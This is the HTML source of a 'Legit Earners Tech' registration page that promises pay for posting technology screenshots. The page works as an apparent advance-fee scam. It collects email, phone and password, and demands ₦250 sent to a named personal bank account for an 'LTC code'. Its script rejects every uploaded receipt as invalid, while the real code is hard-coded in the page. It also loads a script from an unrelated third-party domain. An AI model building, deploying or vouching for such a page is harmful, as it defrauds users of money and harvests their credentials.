<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LEGIT EARNERS TECH </title>
      <meta name="description" content="Join Legit Earners Tech – Earn by posting technology screenshots and get rewarded.">
    <link rel="icon" type="image/png" href="https://www.thecable.ng/wp-content/uploads/2025/01/MTN-NIgeria-768x515.png">
    <style>
      /* Fonts and Reset */
body {
    font-family: 'Poppins', sans-serif;
    background: linear-gradient(to right, #0f172a, #1e293b);
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

/* Container */
.container {
    background: rgba(255, 255, 255, 0.1);
    backdrop-filter: blur(10px);
    padding: 20px;
    border-radius: 12px;
    box-shadow: 0px 0px 15px rgba(255, 255, 255, 0.1);
    width: 350px;
    text-align: center;
    color: white;
}

/* Form Box */
.form-box h2 {
    font-size: 22px;
    margin-bottom: 5px;
}

.form-box p {
    font-size: 14px;
    color: #ddd;
}

/* Input Group */
.input-group {
    display: flex;
    align-items: center;
    margin: 10px 0;
    padding: 10px;
    background: rgba(255, 255, 255, 0.1);
    border-radius: 5px;
}

.input-group i {
    margin-right: 10px;
    color: white;
}

input {
    border: none;
    background: transparent;
    color: white;
    width: 100%;
    font-size: 14px;
    outline: none;
}

/* Buttons */
button {
    width: 100%;
    padding: 12px;
    border: none;
    margin-top: 10px;
    border-radius: 5px;
    cursor: pointer;
    font-size: 14px;
    transition: 0.3s;
}

button:hover {
    opacity: 0.8;
}

.secondary-btn {
    background: transparent;
    border: 1px solid white;
    color: white;
}

/* Toast Message */
.toast {
    display: none;
    background: #e63946;
    color: white;
    padding: 5px;
    border-radius: 5px;
}

/* Modal */
.modal {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.5);
    justify-content: center;
    align-items: center;
}

.modal-content {
    background: white;
    padding: 20px;
    border-radius: 8px;
    text-align: center;
    width: 300px;
    color: black;
}

.close {
    float: right;
    cursor: pointer;
}
    </style>
    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
</head>
<body>
<script type='text/javascript' src='//slushhelmetmirth.com/39/2a/0d/392a0d28346a0e19cd71e87eccfdecf0.js'></script>
    <div class="container">
        <div class="form-box">
            <h2>Join Legit Earners Tech</h2>
            <p>Earn by posting technology screenshots</p>
            <form id="registrationForm">
                <div class="input-group">
                    <i class="fas fa-envelope"></i>
                    <input type="email" id="email" placeholder="Email" required>
                </div>
                <div class="input-group">
                    <i class="fas fa-phone"></i>
                    <input type="tel" id="phone" placeholder="Phone Number" required>
                </div>
                <div class="input-group">
                    <i class="fas fa-lock"></i>
                    <input type="password" id="password" placeholder="Password" required>
                </div>
                <div class="input-group">
                    <i class="fas fa-key"></i>
                    <input type="text" id="ltcCode" placeholder="Enter LTC Code" required>
                </div>
                <button type="submit">Register</button>
                <p id="error-message" class="toast">❌ Incorrect LTC Code</p>
                <button type="button" id="getLtcBtn" class="secondary-btn">Get LTC Code</button>
            </form>
        </div>
    </div>

    <div id="ltcDialog" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <h3>Get Your LTC Code</h3>
            <p>Make a payment of <strong>₦250</strong> to:</p>
            <p>Account Number: <strong>8918814764</strong> <i class="fas fa-copy" id="copyAccount"></i></p>
            <p>Account Name: <strong>Prince NDOKWU</strong></p>
            <p>Bank: <strong>Nombank MFB</strong></p>
            <label>Enter your phone number:</label>
            
            <input type="tel" id="paymentPhone" placeholder="Phone Number">
            
            <button id="proceedBtn">Proceed</button>

            <div id="uploadSection">
                <p>Upload Receipt:</p>
                <input type="file" id="receiptUpload">
                <button id="confirmBtn">Confirm</button>
                <p id="statusMsg">Status: <span>Pending</span></p>
            </div>
        </div>
    </div>

    <script>
      document.getElementById("registrationForm").addEventListener("submit", function(event) {
    event.preventDefault();
    let ltcCode = document.getElementById("ltcCode").value;

    if (ltcCode !== "LTELONMUSK") {
        let toast = document.getElementById("error-message");
        toast.style.display = "block";
        setTimeout(() => toast.style.display = "none", 3000);
    } else {
        window.location.href = "app.tsx";
    }
});

// Open LTC Dialog
document.getElementById("getLtcBtn").addEventListener("click", function() {
    document.getElementById("ltcDialog").style.display = "flex";
});

// Close Modal
document.querySelector(".close").addEventListener("click", function() {
    document.getElementById("ltcDialog").style.display = "none";
});

// Copy Account Number
document.getElementById("copyAccount").addEventListener("click", function() {
    navigator.clipboard.writeText("8918814764");
    alert("Copied to clipboard!");
});

// Upload Receipt
document.getElementById("proceedBtn").addEventListener("click", function() {
    document.getElementById("uploadSection").style.display = "block";
});

document.getElementById("confirmBtn").addEventListener("click", function() {
    document.getElementById("statusMsg").innerHTML = "Status: <strong style='color: orange;'>Your Payment Receipt has  detected invalid Reupload a valid receipt from your bank</strong>";
});
    </script>
</body>
</html>
